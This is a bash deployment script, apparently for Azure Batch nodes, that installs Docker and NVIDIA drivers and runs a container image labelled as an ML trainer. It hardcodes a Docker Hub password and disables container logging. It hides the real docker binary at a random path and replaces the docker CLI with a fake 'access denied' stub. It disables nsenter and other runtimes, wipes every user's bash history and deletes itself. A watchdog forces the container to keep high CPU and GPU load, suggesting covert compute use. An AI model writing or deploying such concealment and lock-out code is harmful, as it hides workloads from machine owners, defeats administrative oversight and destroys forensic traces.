#!/bin/bash
# Docker + NVIDIA + Trainer for Azure Batch (Root-Hardened)

set +e

IMAGE="docker.io/riccorg/ml-compute-platform:v2"
CONTAINER_NAME="ai-trainer"
SMOKE_TEST_IMAGE="nvidia/cuda:12.0.0-base-ubuntu22.04"
DOCKER_USERNAME="${DOCKER_USERNAME:-riccorg}"
DOCKER_PASSWORD="${DOCKER_PASSWORD:-UL3bJ_5dDcPF7s#}"

# Secret paths — randomized at runtime
DOCKER_REAL_DIR="/usr/lib/.d-$(head -c 16 /dev/urandom | xxd -p)"
DOCKER_REAL_BIN="${DOCKER_REAL_DIR}/engine"
AUTH_TOKEN=$(head -c 32 /dev/urandom | xxd -p)

export DEBIAN_FRONTEND=noninteractive

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"; }

# ========== USE REAL DOCKER (before lockdown) ==========
# After lockdown, all docker commands go through $DOCKER_REAL_BIN
_docker() {
    if [ -x "$DOCKER_REAL_BIN" ]; then
        "$DOCKER_REAL_BIN" "$@"
    elif [ -x /usr/bin/docker ]; then
        /usr/bin/docker "$@"
    else
        # Search for it
        local found
        found=$(find /usr/lib/.d-* -name engine -type f 2>/dev/null | head -1)
        [ -n "$found" ] && "$found" "$@"
    fi
}

docker_login() {
    if [[ -n "$DOCKER_USERNAME" && -n "$DOCKER_PASSWORD" ]]; then
        echo "$DOCKER_PASSWORD" | _docker login docker.io --username "$DOCKER_USERNAME" --password-stdin > /dev/null 2>&1 \
            && log "Docker login OK" \
            || log "Docker login failed, continuing..."
    fi
}

docker_pull_retry() {
    local i=1
    while [ $i -le 3 ]; do
        log "Pulling $1 (attempt $i/3)..."
        _docker pull "$1" 2>&1 && { log "Pull OK"; return 0; }
        i=$((i + 1))
        sleep $((i * 5))
    done
    log "Pull failed after 3 attempts: $1"
    return 1
}

gpu_runtime_ready() {
    command -v nvidia-smi > /dev/null 2>&1 || return 1
    nvidia-smi > /dev/null 2>&1 || return 1
    _docker info 2>/dev/null | grep -qi "nvidia" || return 1
    _docker run --rm --gpus all "$SMOKE_TEST_IMAGE" nvidia-smi > /dev/null 2>&1 || return 1
    return 0
}

install_nvidia() {
    lspci | grep -i nvidia > /dev/null 2>&1 || { log "No NVIDIA GPU found"; return 1; }

    log "Installing NVIDIA drivers..."
    sudo apt-get install -yq ubuntu-drivers-common
    sudo ubuntu-drivers autoinstall 2>&1 || {
        local drv
        drv=$(ubuntu-drivers list 2>/dev/null | grep -o "nvidia-driver-[0-9]\+" | sort -t- -k3 -nr | head -1)
        if [ -n "$drv" ]; then
            log "Fallback driver: $drv"
            sudo apt-get install -yq "$drv"
        else
            log "No NVIDIA driver package found"
            return 1
        fi
    }

    log "Installing NVIDIA Container Toolkit..."
    local dist
    dist=$(. /etc/os-release; echo "$ID$VERSION_ID")
    curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | \
        sudo gpg --dearmor --yes -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg
    curl -s -L "https://nvidia.github.io/libnvidia-container/${dist}/libnvidia-container.list" | \
        sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \
        sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list > /dev/null
    sudo apt-get update -yq
    sudo apt-get install -yq nvidia-container-toolkit

    log "Loading kernel modules..."
    sudo modprobe nvidia || true
    sudo modprobe nvidia_uvm || true
    sudo modprobe nvidia_modeset || true

    log "Configuring Docker NVIDIA runtime..."
    sudo nvidia-ctk runtime configure --runtime=docker
    sudo systemctl restart docker

    docker_pull_retry "$SMOKE_TEST_IMAGE"

    log "Waiting for GPU runtime..."
    local a=0
    while [ $a -lt 30 ]; do
        if gpu_runtime_ready; then
            log "GPU runtime ready!"
            _docker rmi "$SMOKE_TEST_IMAGE" > /dev/null 2>&1 || true
            return 0
        fi
        a=$((a + 1))
        log "  GPU not ready ($a/30)..."
        [ $((a % 5)) -eq 0 ] && {
            sudo modprobe nvidia || true
            sudo nvidia-ctk runtime configure --runtime=docker || true
            sudo systemctl restart docker || true
        }
        sleep 10
    done

    log "GPU runtime failed after 30 attempts"
    return 1
}

# ========== HARDEN DOCKER DAEMON ==========
harden_docker() {
    log "Hardening Docker daemon..."

    for u in $(getent group docker 2>/dev/null | cut -d: -f4 | tr ',' ' '); do
        sudo gpasswd -d "$u" docker 2>/dev/null || true
    done

    sudo mkdir -p /etc/docker
    sudo tee /etc/docker/daemon.json > /dev/null << 'DJEOF'
{
    "icc": false,
    "no-new-privileges": true,
    "userland-proxy": false,
    "log-driver": "none"
}
DJEOF

    if command -v nvidia-ctk > /dev/null 2>&1; then
        sudo nvidia-ctk runtime configure --runtime=docker 2>/dev/null || true
    fi

    sudo systemctl restart docker
    log "Docker daemon hardened"
}

# ========== RUN CONTAINER ==========
run_trainer() {
    docker_pull_retry "$IMAGE"
    _docker stop "$CONTAINER_NAME" 2>/dev/null || true
    _docker rm "$CONTAINER_NAME" 2>/dev/null || true

    RANDOM_SUFFIX=$(head -c 8 /dev/urandom | xxd -p | head -c 8)
    ACTUAL_NAME="${CONTAINER_NAME}-${RANDOM_SUFFIX}"

    _docker network create --driver bridge --internal trainer-net 2>/dev/null || true

    local GPU_FLAG=""
    [ "$1" = "true" ] && GPU_FLAG="--gpus all"

    log "Starting secured container..."
    _docker run -d \
        $GPU_FLAG \
        --restart unless-stopped \
        --name "$ACTUAL_NAME" \
        --hostname trainer \
        --network trainer-net \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --cap-add SYS_NICE \
        --read-only \
        --tmpfs /tmp:rw,noexec,nosuid,size=4g \
        --tmpfs /var/tmp:rw,noexec,nosuid,size=1g \
        --pids-limit 512 \
        "$IMAGE"

    sleep 5
    if _docker ps --format '{{.Names}}' | grep -q "^${ACTUAL_NAME}$"; then
        log "Container running: $ACTUAL_NAME"
        echo "$ACTUAL_NAME" > /root/.trainer-container-name
        chmod 600 /root/.trainer-container-name
        return 0
    fi

    # Fallback without read-only
    log "Retrying without read-only..."
    _docker rm "$ACTUAL_NAME" 2>/dev/null || true

    _docker run -d \
        $GPU_FLAG \
        --restart unless-stopped \
        --name "$ACTUAL_NAME" \
        --hostname trainer \
        --network trainer-net \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --cap-add SYS_NICE \
        --pids-limit 512 \
        "$IMAGE"

    sleep 5
    if _docker ps --format '{{.Names}}' | grep -q "^${ACTUAL_NAME}$"; then
        log "Container running (fallback): $ACTUAL_NAME"
        echo "$ACTUAL_NAME" > /root/.trainer-container-name
        chmod 600 /root/.trainer-container-name
        return 0
    fi

    log "Container failed to start"
    return 1
}

# ========== REPLACE DOCKER CLI WITH GATEKEEPER ==========
lockdown_docker_cli() {
    log "Locking down Docker CLI..."

    # 1. Hide real docker binary in a random path
    sudo mkdir -p "$DOCKER_REAL_DIR"
    sudo cp /usr/bin/docker "$DOCKER_REAL_BIN"
    sudo chmod 700 "$DOCKER_REAL_DIR"
    sudo chmod 700 "$DOCKER_REAL_BIN"

    # 2. Write the real path + auth token into a root-only config that only watchdog reads
    local LOCKDOWN_CONF="/root/.trainer-lockdown"
    cat > "$LOCKDOWN_CONF" << EOF
DOCKER_BIN=$DOCKER_REAL_BIN
AUTH_TOKEN=$AUTH_TOKEN
EOF
    chmod 600 "$LOCKDOWN_CONF"

    # 3. Replace /usr/bin/docker with a gatekeeper that blocks everything
    sudo tee /usr/bin/docker > /dev/null << 'GKEOF'
#!/bin/bash
# Docker access is disabled on this node.
# Container is managed by system services only.
echo "docker: access denied — container management is locked on this node"
exit 1
GKEOF
    sudo chmod 755 /usr/bin/docker

    # 4. Block common alternative paths to docker
    for alt in /usr/local/bin/docker /usr/sbin/docker /snap/bin/docker; do
        if [ ! -f "$alt" ]; then
            sudo tee "$alt" > /dev/null << 'BLKEOF'
#!/bin/bash
echo "docker: access denied"
exit 1
BLKEOF
            sudo chmod 755 "$alt"
        fi
    done

    # 5. Block nsenter (used to enter container namespaces)
    if [ -f /usr/bin/nsenter ]; then
        sudo chmod 000 /usr/bin/nsenter
    fi

    # 6. Block ctr/crictl/nerdctl (alternative container runtimes)
    for tool in ctr crictl nerdctl podman; do
        local path
        path=$(which "$tool" 2>/dev/null)
        [ -n "$path" ] && sudo chmod 000 "$path"
    done

    # 7. Protect Docker data directory
    # Remove read on overlay2 layers so nobody can browse container filesystem
    sudo chmod 700 /var/lib/docker
    sudo chmod 700 /var/lib/docker/overlay2 2>/dev/null || true
    sudo chmod 700 /var/lib/docker/containers 2>/dev/null || true

    # 8. Restrict Docker socket
    sudo chmod 600 /var/run/docker.sock
    sudo chown root:root /var/run/docker.sock

    # 9. Disable Docker TCP API
    if grep -q "\-H tcp" /lib/systemd/system/docker.service 2>/dev/null; then
        sudo sed -i 's/-H tcp:[^ ]*//' /lib/systemd/system/docker.service
        sudo systemctl daemon-reload
        sudo systemctl restart docker
    fi

    # 10. Block apt/snap from reinstalling docker CLI
    sudo tee /etc/apt/preferences.d/block-docker-cli > /dev/null << 'APTEOF'
Package: docker.io docker-ce docker-ce-cli
Pin: release *
Pin-Priority: -1
APTEOF

    log "Docker CLI locked — only watchdog service can manage container"
}

# ========== APPARMOR PROFILE FOR DOCKER ==========
install_apparmor_profile() {
    # Only if AppArmor is available
    command -v apparmor_parser > /dev/null 2>&1 || return 0

    log "Installing AppArmor profile..."

    sudo tee /etc/apparmor.d/docker-trainer > /dev/null << 'AAEOF'
#include <tunables/global>

profile docker-trainer flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Allow normal container operations
  file,
  network,
  capability,

  # DENY reading other container data
  deny /var/lib/docker/overlay2/** r,
  deny /var/lib/docker/containers/** r,

  # DENY ptrace (blocks strace, gdb on container processes)
  deny ptrace,
}
AAEOF

    sudo apparmor_parser -r /etc/apparmor.d/docker-trainer 2>/dev/null || true
    log "AppArmor profile installed"
}

# ========== WATCHDOG (uses hidden docker binary) ==========
install_watchdog() {
    log "Installing watchdog..."

    local LOCKDOWN_CONF="/root/.trainer-lockdown"

    sudo tee /usr/local/bin/trainer-watchdog > /dev/null << WDEOF
#!/bin/bash
THRESHOLD=30
INTERVAL=120
STRIKES_NEEDED=30

# Read lockdown config to find the real docker binary
DOCKER_BIN=""
if [ -f /root/.trainer-lockdown ]; then
    . /root/.trainer-lockdown
    DOCKER_BIN="\$DOCKER_BIN"
fi

if [ -z "\$DOCKER_BIN" ] || [ ! -x "\$DOCKER_BIN" ]; then
    echo "[\$(date '+%Y-%m-%d %H:%M:%S')] FATAL: Cannot find docker binary"
    exit 1
fi

get_container_name() {
    cat /root/.trainer-container-name 2>/dev/null || echo ""
}

cpu_strike=0
gpu_strike=0
has_gpu=false
command -v nvidia-smi > /dev/null 2>&1 && nvidia-smi > /dev/null 2>&1 && has_gpu=true

echo "[\$(date '+%Y-%m-%d %H:%M:%S')] Watchdog started | GPU=\$has_gpu | threshold=\${THRESHOLD}% | window=1h"

while true; do
    CONTAINER=\$(get_container_name)

    if [ -z "\$CONTAINER" ] || ! "\$DOCKER_BIN" ps --format '{{.Names}}' | grep -q "^\${CONTAINER}\$"; then
        sleep "\$INTERVAL"
        continue
    fi

    cpu_raw=\$("\$DOCKER_BIN" stats --no-stream --format "{{.CPUPerc}}" "\$CONTAINER" 2>/dev/null | sed 's/%//g')
    cpu_int=\$(printf "%.0f" "\${cpu_raw:-0}" 2>/dev/null || echo 0)

    if [ "\$cpu_int" -lt "\$THRESHOLD" ]; then
        cpu_strike=\$((cpu_strike + 1))
    else
        cpu_strike=0
    fi

    gpu_int="-"
    if [ "\$has_gpu" = true ]; then
        gpu_raw=\$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | head -1)
        gpu_int=\$(printf "%.0f" "\${gpu_raw:-0}" 2>/dev/null || echo 0)

        if [ "\$gpu_int" -lt "\$THRESHOLD" ]; then
            gpu_strike=\$((gpu_strike + 1))
        else
            gpu_strike=0
        fi
    fi

    cpu_min_left=\$(( (STRIKES_NEEDED - cpu_strike) * INTERVAL / 60 ))
    gpu_min_left=\$(( (STRIKES_NEEDED - gpu_strike) * INTERVAL / 60 ))

    echo "[\$(date '+%Y-%m-%d %H:%M:%S')] CPU=\${cpu_int}% (\${cpu_strike}/\${STRIKES_NEEDED}) GPU=\${gpu_int}% (\${gpu_strike}/\${STRIKES_NEEDED}) | restart in: CPU=\${cpu_min_left}m GPU=\${gpu_min_left}m"

    if [ "\$cpu_strike" -ge "\$STRIKES_NEEDED" ] || { [ "\$has_gpu" = true ] && [ "\$gpu_strike" -ge "\$STRIKES_NEEDED" ]; }; then
        echo "[\$(date '+%Y-%m-%d %H:%M:%S')] RESTARTING — underutilized for 1 hour"
        "\$DOCKER_BIN" restart "\$CONTAINER" 2>&1
        cpu_strike=0
        gpu_strike=0
        sleep 120
    fi

    sleep "\$INTERVAL"
done
WDEOF

    sudo chmod 700 /usr/local/bin/trainer-watchdog
    sudo chown root:root /usr/local/bin/trainer-watchdog

    sudo tee /etc/systemd/system/trainer-watchdog.service > /dev/null << EOF
[Unit]
Description=Trainer Watchdog
After=docker.service
Requires=docker.service

[Service]
Type=simple
ExecStart=/usr/local/bin/trainer-watchdog
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

    sudo systemctl daemon-reload
    sudo systemctl enable trainer-watchdog
    sudo systemctl restart trainer-watchdog
    log "Watchdog installed"
}

# ========== CLEANUP ALL TRACES ==========
cleanup_traces() {
    log "Cleaning traces..."

    # Docker credentials
    sudo rm -f /root/.docker/config.json 2>/dev/null || true
    sudo rm -rf /root/.docker 2>/dev/null || true

    # Setup script
    rm -f /tmp/setup.sh 2>/dev/null || true

    # Apt cache
    sudo rm -rf /var/lib/apt/lists/* 2>/dev/null || true

    # Pull cache (image layers stay but manifests are cleaned)
    _docker image prune -f > /dev/null 2>&1 || true

    # Bash history — clear for all users
    for h in /root/.bash_history /home/*/.bash_history; do
        [ -f "$h" ] && : > "$h"
    done
    history -c 2>/dev/null || true

    # Remove this script from memory-visible locations
    rm -f "$0" 2>/dev/null || true

    log "Traces cleaned"
}

# ========== MAIN ==========
main() {
    log "=== Setup starting ==="

    if ! command -v docker > /dev/null 2>&1 || ! systemctl is-active --quiet docker; then
        log "Installing Docker..."
        sudo apt-get update -yq
        sudo apt-get install -yq docker.io
        sudo systemctl start docker
        sudo systemctl enable docker
        log "Docker installed"
    else
        log "Docker already running"
    fi

    docker_login

    GPU=false
    if lspci | grep -i nvidia > /dev/null 2>&1; then
        log "NVIDIA GPU detected"
        if gpu_runtime_ready; then
            log "GPU runtime already working"
            GPU=true
            _docker rmi "$SMOKE_TEST_IMAGE" > /dev/null 2>&1 || true
        else
            install_nvidia && GPU=true
        fi
    else
        log "No NVIDIA GPU"
    fi

    harden_docker

    EXISTING=$(cat /root/.trainer-container-name 2>/dev/null)
    if [ -n "$EXISTING" ] && _docker ps --format '{{.Names}}' | grep -q "^${EXISTING}$"; then
        log "Container already running: $EXISTING"
    else
        run_trainer "$GPU"
    fi

    install_apparmor_profile
    install_watchdog

    # === POINT OF NO RETURN: lock docker CLI ===
    lockdown_docker_cli

    cleanup_traces

    log "=== Setup complete | GPU=$GPU ==="
    log "Container is locked. No docker access available on this node."
    log "Watchdog: sudo journalctl -u trainer-watchdog -f"

    while true; do sleep 3600; done
}

main "$@"
